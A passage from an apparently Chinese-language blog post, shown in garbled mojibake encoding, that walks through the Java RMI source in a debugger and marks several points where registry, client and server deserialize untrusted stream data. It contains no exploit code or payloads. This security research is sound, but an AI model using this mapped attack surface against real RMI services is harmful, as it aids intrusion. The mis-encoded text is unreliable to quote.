class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        registry.bind(<span class="string">&quot;test&quot;</span>,iRemoteObj);</span><br><span class="line">        System.out.println(<span class="string">&quot;RMIServer running!!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="åˆ›å»ºè¿œç¨‹æœåŠ¡"><a href="#åˆ›å»ºè¿œç¨‹æœåŠ¡" class="headerlink" title="åˆ›å»ºè¿œç¨‹æœåŠ¡"></a>åˆ›å»ºè¿œç¨‹æœåŠ¡</h3><p>ä¸‹æ–­ç‚¹å¼€å§‹è°ƒè¯•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732171658349-888637d2-77ea-40ee-aec4-9247438d27af.png"></p><p>è·Ÿè¿›å»ä¼šè·Ÿåˆ°æˆ‘ä»¬æ¥å£çš„å®ç°ç±»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732171706842-dfd51f75-edd9-412d-bba5-fea5b38afd37.png"></p><p>è¿™é‡Œç»§æ‰¿çš„æ˜¯UnicastRemoteObjectç±»æ‰€ä»¥ç»§ç»­è·Ÿè¿›çœ‹çœ‹æˆ‘ä»¬çš„å¯¹è±¡æ˜¯å¦‚ä½•åˆ›å»ºçš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732174530067-5187ee0e-7cf7-4cc7-be24-496b06b85368.png"></p><p>è¿™é‡Œå…¶å®å°±æ˜¯ä¼šå°†è¿œç¨‹å¯¹è±¡å‘å¸ƒåˆ°ä¸€ä¸ªå®é™…çš„ç«¯å£ä¸Šï¼Œè·Ÿè¿›çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732174659131-32723ba4-fda1-4997-bb55-167a8def703e.png"></p><p>è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¼ å…¥äº†ä¸€ä¸ªè¿œç¨‹å¯¹è±¡å’Œä¸€ä¸ªUnicastServerRefç±»å‰é¢çš„è¿œç¨‹å¯¹è±¡æ˜¯çœŸæ­£çš„é€»è¾‘åé¢çš„æ˜¯ç”¨äºå¤„ç†ç½‘ç»œè¯·æ±‚çš„ã€‚ä¼ è¿›å»ä¸€ä¸ªç«¯å£ï¼Œipæ˜¯è‡ªåŠ¨è·å–çš„ã€‚ç»§ç»­è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180342636-98ef5246-1da6-4e31-befd-0eaaab920748.png"></p><p>ç»§ç»­è·Ÿåˆ°LiveRefç±»é‡Œé¢å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180399829-6168d19c-af70-4fdd-9ad4-88074518983e.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180429820-f924c85b-1a9d-4ca9-a0d3-c1a76e7a8a48.png"></p><p>è¿™é‡Œè°ƒç”¨äº†LiverRefçš„æ„é€ å‡½æ•°ç¬¬ä¸€ä¸ªæ˜¯objectidåé¢æ˜¯ä¸€ä¸ªç½‘ç»œå¤„ç†çš„ç±»ï¼Œè¿™ä¸ªç±»é‡Œé¢è·å–äº†ipå¯ä»¥è‡ªå·±è·Ÿè·Ÿçœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180666520-9a22a062-2136-4710-9ec9-06ba1ae841a5.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180854518-1b6cbd9a-353b-4117-bef9-044c7ce5a3cd.png"></p><p>åˆ°è¿™é‡Œå°±æœ‰äº†ipå’ŒçœŸæ­£å¤„ç†ç½‘ç»œè¯·æ±‚çš„ä¸œè¥¿</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180877372-e7a402d3-176e-4293-93b4-5401c7affe3c.png"></p><p>è¿™é‡Œå°±ä¼šè°ƒç”¨çˆ¶ç±»UnicastrRefçš„æ„é€ æ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732180914892-e74884bb-901c-4d61-8d5a-500ca74d7961.png">å…¶å®å°±æ˜¯ä¸€ä¸ªèµ‹å€¼æ“ä½œ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732181076762-493c2e72-97f6-41c4-95b9-dba8394f4c61.png">åˆå›åˆ°exportObjectä¸­ç»§ç»­å‘ä¸‹è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732181123623-32565726-d4db-472d-a7f4-6698b526a833.png"></p><p>ç„¶åè¿™é‡Œä¼ è¿›æ¥äº†æˆ‘ä»¬ä¹‹å‰åˆ›å»ºçš„UnicastServerRefï¼Œç„¶ååˆé‡æ–°è¿›è¡Œäº†èµ‹å€¼ï¼Œä½†æ˜¯è¿™é‡Œé¢å…¶å®è¿˜æ˜¯æˆ‘ä»¬ä¹‹å‰çš„LiveRefï¼Œç„¶åæ¥ä¸‹æ¥åˆè°ƒç”¨äº†exportObjectï¼Œåœ¨è¿™æ•´ä¸ªè¿‡ç¨‹ä¸­ä¸€ç›´éƒ½åœ¨è°ƒç”¨exportObjectï¼Œåªæ˜¯åœ¨ä¸åŒçš„ç±»å»è°ƒç”¨</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732181248778-ac9331cf-7a92-47c4-ac94-e126407a0547.png"></p><p>è·Ÿè¿›æ¥ä¹‹åå‘ç°è¿™é‡Œæ˜¯åˆ›å»ºäº†ä¸€ä¸ªä»£ç†ä¹Ÿå°±æ˜¯ä¹‹å‰æ‰€è¯´çš„å®¢æˆ·ç«¯çœŸæ­£è°ƒç”¨çš„ä»£ç†ï¼Œä¹Ÿå°±æ˜¯çœŸæ­£ç½‘ç»œè¯·æ±‚çš„ä¸œè¥¿</p><p>ä¸ºä»€ä¹ˆè¦åœ¨æœåŠ¡ç«¯åˆ›å»ºå‘¢ï¼Œå…¶å®é€šè¿‡å‰é¢çš„æµç¨‹å¯ä»¥çŸ¥é“æ˜¯æœåŠ¡ç«¯å…ˆåˆ›å»ºå¥½ç„¶åæ”¾åˆ°æ³¨å†Œä¸­å¿ƒç„¶åå®¢æˆ·ç«¯åœ¨å»æ³¨å†Œä¸­å¿ƒè°ƒç”¨è¿™ä¸ªä»£ç†ã€‚çœ‹ä¸€ä¸‹å…·ä½“æ˜¯æ€ä¹ˆåˆ›å»ºçš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732181798893-73a40a3f-248d-4098-bcfc-763d63511154.png"></p><p>é€šè¿‡è°ƒç”¨createProxyæ–¹æ³•è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732181770715-c57703fa-ee80-4299-b22b-ba0ae167a39a.png"></p><p>è¿™é‡Œç¬¬ä¸€ä¸ªå‚æ•°å°±æ˜¯å°±æ˜¯è¿œç¨‹å¯¹è±¡çš„ç±»ï¼Œ clientRefå®é™…å°±æ˜¯æˆ‘ä»¬åˆ›å»ºçš„liveRefã€‚ç»§ç»­å‘ä¸‹ä¼šæœ‰ä¸€ä¸ªåˆ¤æ–­å¦‚æœä¸ºTrueçš„è¯å°±ä¼šåˆ›å»ºè¿™ä¸ªstubæ‰€ä»¥ç»§ç»­è·Ÿåˆ°stuClassExistsæ–¹æ³•åˆ¤æ–­æ˜¯å¦ä¸ºtrueæˆ–false</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732182038750-0cd7046a-3dc4-4880-9c6e-25f1b14b8008.png"></p><p>ç„¶ååœ¨è¿™é‡Œå¯ä»¥äº†è§£åˆ°ï¼Œè¿™é‡Œä¼šåœ¨åå­—ååŠ ä¸Š<code>_Stub</code>ï¼Œå¦‚æœæœ‰è¿™ä¸ªç±»çš„è¯å°±ä¼šä¸ºçœŸï¼Œä½†æ˜¯æˆ‘ä»¬æ²¡æœ‰å†™è¿™ä¸ªç±»ï¼Œå®é™…ä¸Šæ˜¯åœ¨JDKä¸­è‡ªå·±å®šä¹‰äº†è¿™ä¸ªç±»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732182320232-9dce16dd-6551-4bae-9c3f-8d7d021d3f5f.png"></p><p>å¦‚æœè¯´è¦è°ƒç”¨è¿™äº›ç±»çš„è¯å°±ä¼šç›´æ¥åˆ°è¿™é‡Œé¢æ‰¾ï¼Œä½†æ˜¯æˆ‘ä»¬ç°åœ¨æ²¡æœ‰ç”¨åˆ°ï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯falseï¼Œç„¶åæ¥ä¸‹æ¥å°±æ˜¯ä¸€ä¸ªåˆ›å»ºåŠ¨æ€ä»£ç†æ ‡å‡†æµç¨‹ï¼Œç„¶åæˆ‘ä»¬å¯ä»¥çœ‹è§åœ¨handlerä¸­ä¿å­˜çš„è¿˜æ˜¯æˆ‘ä»¬ä¹‹å‰çš„LiveRef</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732182488239-278d1aee-8387-490a-b03e-e23fe161dabd.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732182502246-bb11be6c-a72f-49c7-8c21-847ea1bbc11a.png"></p><p>ç„¶åæˆ‘ä»¬çš„åŠ¨æ€ä»£ç†å°±åˆ›å»ºå¥½äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732182566736-6578fe49-3898-486e-9ac2-f310405d46e0.png"></p><p>ç„¶åä¸‹ä¸€æ­¥å°±æ˜¯åˆ›å»ºäº†ä¸€ä¸ªTargetï¼Œå…¶å®å°±æ˜¯ä¸€ä¸ªæ€»å°è£…</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732182769045-b9b19ab6-0024-4f0f-a48c-0474b1992ab6.png"></p><p>è·Ÿè¿›å»çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183210337-df8dc952-59dd-4f04-9d43-92eb1aa3c8bb.png"></p><p>è¿™é‡Œçš„idå’ŒliveRefçš„idæ˜¯åŒä¸€ä¸ªï¼Œè¿™å°±è¯´æ˜è¿™ä¸­é—´æœ€æ ¸å¿ƒçš„å°±æ˜¯LiveRef</p><p>ç»§ç»­å‘ä¸‹æ‰§è¡Œåˆ°<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183258597-f9ef7325-8305-4d6c-a5fc-0dad8cf76856.png"></p><p>è·Ÿè¿›å»ç„¶åæˆ‘ä»¬è·Ÿåˆ°è°ƒç”¨çš„éƒ¨åˆ†ï¼Œç„¶åå°±è·Ÿè¿›åˆ°TCPTransportçš„exportObject</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183305800-a957ee57-431e-4f9b-936b-73a22594363a.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183322741-0e141d8a-95a3-4047-9542-2091480dc9fa.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183336411-0aa0e293-9b71-4c11-aed3-83cc6bf9050f.png"></p><p>è¿™é‡Œèƒ½å¤Ÿçœ‹åˆ°å¼€å¯äº†listen(),ä¹Ÿå°±æ˜¯çœŸæ­£çš„å¯¹ç½‘ç»œè¯·æ±‚è¿›è¡Œå¤„ç†äº†</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183488072-a9ccca25-8a0e-4767-83db-f320f70b3dee.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¼€å¯äº†ä¸€ä¸ªæ–°çš„çº¿ç¨‹åŒºåˆ†äºä»£ç é€»è¾‘çš„çº¿ç¨‹ï¼Œç„¶åå¼€å¯çº¿ç¨‹ç­‰åˆ°å®¢æˆ·ç«¯çš„è¿æ¥ï¼Œç„¶ååœ¨è¿‡ç¨‹ä¸­ä¹Ÿç»™ç«¯å£è¿›è¡Œäº†èµ‹å€¼ï¼ˆä¹‹å‰æ˜¯é»˜è®¤å€¼0ï¼‰</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183565105-dbcc33ed-2a4f-4085-b243-767bcf3df472.png"></p><p>ç„¶åè¿™ä¸ªè¿œç¨‹å¯¹è±¡å°±å·²ç»å‘å¸ƒå‡ºå»äº†ï¼Œç»§ç»­å‘ä¸‹æ‰§è¡Œåˆ°<code>super.exportObject(target);</code>è·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183661797-d5dab711-1d72-4170-bbbf-11cb2ef7b1b5.png"></p><p>å…ˆæ˜¯è¿›è¡Œäº†ä¸€ä¸ªèµ‹å€¼ï¼Œç„¶åæ‰§è¡ŒputTarget</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732183716784-3da1ec28-ec8b-4137-aca7-21b595d54556.png"></p><p>åœ¨è¿™è¿‡ç¨‹ä¸­è¿™é‡Œå°†targetä¿å­˜åœ¨äº†è‡ªå·±å®šä¹‰çš„ä¸€ä¸ªé™æ€çš„è¡¨é‡Œé¢ï¼Œç„¶ååˆ°è¿™é‡Œå‘å¸ƒçš„æ•´ä¸ªè¿‡ç¨‹å°±å°±å®Œæˆäº†</p><h3 id="åˆ›å»ºæ³¨å†Œä¸­å¿ƒ"><a href="#åˆ›å»ºæ³¨å†Œä¸­å¿ƒ" class="headerlink" title="åˆ›å»ºæ³¨å†Œä¸­å¿ƒ"></a>åˆ›å»ºæ³¨å†Œä¸­å¿ƒ</h3><p>åˆ›å»ºæ³¨å†Œä¸­å¿ƒçš„æµç¨‹åœ¨å¤§è‡´ä¸Šå’Œåˆ›å»ºè¿œç¨‹æœåŠ¡çš„å·®ä¸å¤šï¼Œä¸»è¦çš„å·®åˆ«å°±æ˜¯åœ¨åˆ›å»ºä»£ç†ï¼ˆ<code>createProxy</code>ï¼‰çš„æ—¶å€™</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732184659355-98eeca5b-ea5f-46e9-a782-b35639d790d9.png"></p><p>ä¸»è¦çš„ä¸åŒç‚¹åœ¨è¿™é‡Œå¯ä»¥çœ‹åˆ°åœ¨åˆ›å»ºè¿œç¨‹æœåŠ¡çš„æ—¶å€™æ˜¯æ²¡æœ‰è¿›å…¥åˆ°è¿™ä¸ªé€»è¾‘é‡Œçš„</p><p>è€Œåœ¨è¿™é‡Œæ˜¯ä¼šè¿›å…¥è¿™ä¸ªå‡½æ•°çš„ï¼Œè¿™æ˜¯å› ä¸ºä¹‹å‰è¿œç¨‹æœåŠ¡æ˜¯æ‰¾ä¸åˆ°è¿™ä¸ªç±»ï¼Œä½†æ˜¯åœ¨åˆ›å»ºæ³¨å†Œä¸­å¿ƒçš„æ—¶å€™æ˜¯èƒ½å¤Ÿåœ¨JDKè‡ªå·±çš„ç±»ä¸­æ‰¾åˆ°å¯¹åº”çš„ç±»çš„</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732188107934-8b313186-8589-4b34-9d74-57f3cef02ce6.png"></p><p>ç„¶åç›´æ¥<code>forName</code>åˆ›å»ºä»£ç†ç±»ç»§ç»­å‘ä¸‹èµ°</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732188209036-6122e2e7-ce9e-4efa-95ff-1a63b6b30a60.png">è¿™é‡Œæ˜¯åˆ¤æ–­ä¸€ä¸‹æ˜¯å¦æ˜¯æœåŠ¡ç«¯åˆ›å»ºå‡ºæ¥çš„ï¼Œå¦‚æœä¸ºTureå°±è°ƒç”¨ä¸€ä¸ªsetSkeletonæ–¹æ³•<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732188258297-f7b87b3a-ab7c-4092-bf3e-ccfe055f784b.png"></p><p>ç„¶åè°ƒç”¨createSkeletonï¼Œè·Ÿè¿›</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732188302107-65149e36-ffcb-4b40-a80e-28af245e0071.png">Skeletonå¯ä»¥æ ¹æ®ä¹‹å‰çš„æµç¨‹å›¾å¾—çŸ¥ä»–æ˜¯æœåŠ¡ç«¯çš„ä»£ç†ï¼Œç„¶åè¿™ä¹Ÿæ˜¯é€šè¿‡<code>forName</code>ç›´æ¥åˆ›å»ºå‡ºæ¥çš„</p><p>ç„¶åå›åˆ°<code>UnicastServerRef#exportObject</code>å¯ä»¥å‘ç°implä¸­ä¿å­˜çš„refä¸­åŠ äº†ä¸€ä¸ªskelå¯¹è±¡ï¼Œæ¥ä¸‹å°±æ˜¯åˆ›å»ºTargetï¼Œå¹¶ä¸”æŠŠTargetä¿å­˜ï¼Œè¿›å…¥<code>ref.exportObject(target);</code>ä¸­ï¼Œç„¶åèµ°åˆ°putTargetçš„ä½ç½®</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732188561503-9d77ebae-be84-4a9b-b181-bfc3af56e07d.png">ç„¶åæŸ¥çœ‹ObjectTableä¸­ä¿å­˜äº†ä¸€äº›ä»€ä¹ˆï¼Œç„¶åæˆ‘ä»¬åˆ›å»ºçš„è¿œç¨‹å¯¹è±¡åº”è¯¥éƒ½æ˜¯ä¿å­˜åœ¨è¿™ä¸ªé‡Œé¢çš„<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732194004625-c70b101f-da76-4fb5-b76b-8d6c218e443e.png"></p><p>å…¶ä¸­<code>DGCImpl_Stub</code>å¹¶ä¸æ˜¯æˆ‘ä»¬åˆ›å»ºçš„ï¼Œè¿™ä¸ªæ˜¯é»˜è®¤åˆ›å»ºçš„ä¸€ä¸ªåˆ†å¸ƒå¼åƒåœ¾å›æ”¶çš„ç±»ï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä¸ªå¾ˆé‡è¦çš„ç±»ï¼Œç„¶åå‰©ä¸‹çš„ä¸¤ä¸ªå°±æ˜¯æˆ‘ä»¬è‡ªå·±åˆ›å»ºçš„ä¸¤ä¸ªç±»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732194019439-1e9aba74-aacd-40c9-bece-398747cc1fcb.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732194029716-de94504c-d7f0-4d09-8496-9beee5f991ca.png">ä¸€ä¸ªè¿œç¨‹æœåŠ¡çš„åŠ¨æ€ä»£ç†Stubç±»è¿™é‡Œé¢çš„skelä¸ºnullï¼Œä¸€ä¸ªæ³¨å†Œä¸­å¿ƒçš„Stubç±»å¹¶ä¸”é‡Œé¢å­˜åœ¨ä¸€ä¸ªskel</p><h3 id="ç»‘å®šæ³¨å†Œä¸­å¿ƒ"><a href="#ç»‘å®šæ³¨å†Œä¸­å¿ƒ" class="headerlink" title="ç»‘å®šæ³¨å†Œä¸­å¿ƒ"></a>ç»‘å®šæ³¨å†Œä¸­å¿ƒ</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732194596363-a7636587-80a3-4cb4-b3a7-f9d33b1978f1.png"></p><p>è¿™é‡Œå°±æ˜¯æ£€æŸ¥æˆ‘ä»¬ä¼ è¿›æ¥çš„testæœ‰æ²¡æœ‰è¢«ç»‘å®šå¦‚æœå·²ç»ç»‘å®šå°±ä¼šæŠ¥ä¸€ä¸ªå¼‚å¸¸ï¼Œæ²¡æœ‰çš„è¯å°±æŠŠå®ƒputè¿›å»ã€‚</p><h3 id="å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-â€”â€”â€”â€”-å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ-â€”â€”â€”â€”-å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ â€”â€”â€”â€” å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒ â€”â€”â€”â€” å®¢æˆ·ç«¯</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732199700539-cddd0704-eb39-469f-b456-9fff6f2fffb5.png"></p><p>è¿™é‡Œå…¶å®å’Œä¹‹å‰æœåŠ¡ç«¯åˆ›å»ºæ³¨å†Œä¸­å¿ƒæ˜¯ä¸€æ ·çš„ï¼Œè¿™é‡Œä¹Ÿåœ¨æ˜¯æœ¬åœ°åˆ›å»ºäº†ä¸€ä¸ªLiveRefï¼Œç„¶åæŠŠipå’Œç«¯å£æ”¾äº†è¿›å»ï¼Œç„¶åå°è£…äº†ä¸€ä¸‹ï¼Œå†ç„¶åå°±æ˜¯åˆè°ƒç”¨äº†<code>Util.createProxy</code>æ–¹æ³•é‡æ–°åˆ›å»ºäº†ä¸€ä¸ªStub</p><p>æ¥ä¸‹æ¥å°±æ˜¯è·å–è¿œç¨‹å¯¹è±¡é€šè¿‡lookup</p><h4 id="åå­¦åºåˆ—åŒ–1"><a href="#åå­¦åºåˆ—åŒ–1" class="headerlink" title="åå­¦åºåˆ—åŒ–1"></a>åå­¦åºåˆ—åŒ–1</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732200324611-73dc2973-32d5-4d24-919c-c7bef5a8a5a2.png"></p><p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šå°†è¿œç¨‹å¯¹è±¡çš„åç§°è¿›è¡Œåºåˆ—åŒ–ï¼Œé‚£ä¹ˆåŒæ ·çš„å°±å¯ä»¥æƒ³åˆ°æ³¨å†Œä¸­å¿ƒè‚¯å®šä¼šååºåˆ—åŒ–è¯»ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªååºåˆ—åŒ–ç‚¹ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç»§ç»­å¾€ä¸‹è·Ÿæœ‰ä¸ªinvokeæ–¹æ³•è·Ÿè¿›å»</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732200579372-4d028e22-2eb9-4434-87fd-9a4cd29a676f.png"></p><p>è¿™é‡Œæœ‰ä¸ªexecuteCallæ–¹æ³•ç»§ç»­è·Ÿè¿›å»ã€‚</p><h4 id="ååºåˆ—åŒ–2"><a href="#ååºåˆ—åŒ–2" class="headerlink" title="ååºåˆ—åŒ–2"></a>ååºåˆ—åŒ–2</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732200901127-b8825baa-ab97-48ee-baf4-30833cf343be.png"></p><p>åœ¨è¿™é‡Œçš„è¯å¦‚æœäº§ç”Ÿäº†è¿™ä¸ªå¼‚å¸¸çš„è¯ä¹Ÿä¼šé€šè¿‡ååºåˆ—åŒ–è¯»å‡ºå¯¹è±¡ï¼Œè¿™é‡Œçš„æœ¬æ„åº”è¯¥æ˜¯å¦‚æœäº§ç”Ÿäº†å¼‚å¸¸äº†å°±é€šè¿‡ååºåˆ—åŒ–è¯»å‡ºæ›´è¯¦ç»†çš„å¼‚å¸¸ä¿¡æ¯</p><h4 id="ååºåˆ—åŒ–3"><a href="#ååºåˆ—åŒ–3" class="headerlink" title="ååºåˆ—åŒ–3"></a>ååºåˆ—åŒ–3</h4><p>è¿™é‡Œæˆ‘ä»¬å›æº¯å‡ºæ¥ç»§ç»­å‘ä¸‹è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732201029380-26e09f9e-5527-4f83-9c09-5010899743b3.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šä»æ³¨å†Œä¸­å¿ƒè¿”å›çš„è¾“å…¥æµååºåˆ—åŒ–è¯»å–ã€‚</p><p>æœ€åå°±æ˜¯è·å–è¿œç¨‹å¯¹è±¡äº†</p><h3 id="å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯â€”â€”â€”â€”å®¢æˆ·ç«¯"><a href="#å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯â€”â€”â€”â€”å®¢æˆ·ç«¯" class="headerlink" title="å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯â€”â€”â€”â€”å®¢æˆ·ç«¯"></a>å®¢æˆ·ç«¯è¯·æ±‚æœåŠ¡ç«¯â€”â€”â€”â€”å®¢æˆ·ç«¯</h3><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732201831682-513c973a-b27b-409c-9ef4-497e9be114cd.png"></p><p>ç”±äºä½¿ç”¨äº†åŠ¨æ€ä»£ç†æ‰€ä»¥å¿…ç„¶ä¼šèµ°åˆ°ä¸€ä¸ªinvokeæ–¹æ³•é‡Œï¼Œçœ‹åˆ°ä¸‹é¢è°ƒç”¨äº†invokeRemoteMethodæ–¹æ³•</p><p>è·Ÿè¿›çœ‹çœ‹</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732201897702-806cd96f-313b-4653-a6fc-66319eea389c.png"></p><p>ç»§ç»­è·Ÿåˆ°invoke</p><h4 id="ååºåˆ—åŒ–4"><a href="#ååºåˆ—åŒ–4" class="headerlink" title="ååºåˆ—åŒ–4"></a>ååºåˆ—åŒ–4</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732202225575-1998b06b-4c19-4e6c-afbd-311c16c70259.png"></p><p>è¿™é‡Œä¼šè°ƒç”¨ä¸€ä¸ªexecuteCallæ–¹æ³•ä¹‹å‰è¯´è¿‡è¿™é‡Œä¼šæœ‰ä¸€ä¸ªååºåˆ—åŒ–ç‚¹è·Ÿä¸Šæ–‡è¯´çš„ååºåˆ—åŒ–ç‚¹2ä¸€è‡´</p><p>ç»§ç»­å‘ä¸‹è·Ÿ</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732202348754-8bc9ac59-8bb7-4b4f-9323-02843f4f2652.png"></p><p>è¿™é‡Œæœ‰ä¸€ä¸ªunmarshalValueè·Ÿè¿›å»</p><h4 id="ååºåˆ—åŒ–5"><a href="#ååºåˆ—åŒ–5" class="headerlink" title="ååºåˆ—åŒ–5"></a>ååºåˆ—åŒ–5</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1732253271050-082eaac5-791e-463e-9321-1b6920c83775.png"></p><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œä¼šé€šè¿‡ååºåˆ—åŒ–è·å–è¿œç¨‹å¯¹è±¡ä¼ è¿‡æ¥çš„å€¼ï¼Œå¹¶ä¸”ç±»å‹ä¸æ˜¯åŸºæœ¬ç±»å‹å°±ä¼šååºåˆ—åŒ–ã€‚</p><h3 id="å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒâ€”â€”â€”â€”æ³¨å†Œä¸­å¿ƒ"><a href="#å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒâ€”â€”â€”â€”æ³¨å†Œä¸­å¿ƒ" class="headerlink" title="å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒâ€”â€”â€”â€”æ³¨å†Œä¸­å¿ƒ"></a>å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒâ€”â€”â€”â€”æ³¨å†Œä¸­å¿ƒ</h3><p>åœ¨ä¹‹å‰åˆ†æåˆ›å»ºè¿œç¨‹æœåŠ¡å’Œæ³¨å†Œä¸­å¿ƒæ˜¯å¹¶æ²¡æœ‰ä»”ç»†çœ‹listenæ–¹æ³•é‡Œçš„é€»è¾‘ï¼Œå› ä¸ºæˆ‘ä»¬è¦çœ‹å®¢æˆ·ç«¯è¯·æ±‚æ³¨å†Œä¸­å¿ƒä¹‹åæ³¨å†Œä¸­å¿ƒçš„æ‰§è¡Œæµç¨‹æ‰€ä»¥æˆ‘ä»¬å°±åœ¨çœ‹çœ‹</p><p><img 